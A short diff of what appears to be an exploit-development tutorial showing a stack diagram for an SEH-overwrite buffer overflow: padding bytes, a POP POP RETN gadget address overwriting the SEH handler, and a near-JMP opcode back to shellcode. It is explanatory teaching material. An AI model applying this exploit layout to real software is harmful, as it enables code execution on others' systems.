@@ -376,7 +376,7 @@ Can we just replace the short jmp with the long jmp to our shellcode?
        |------------------------------------|
        | b'\xe9\x02\xf2\xff\xff'            | # 3. JMP to shellcode -------------------------
 -----> |------------------------------------|                                                |
-|      | Padding                            |                                                |
+|      | b'C' * 2                           |                                                |
 |      |------------------------------------|                                                |
 |      | 0x6250271B (POP R32; POP R32; RETN)| # 1. Overwriting SEH handler; RETN will run -  |
 |      |------------------------------------|                                             |  |
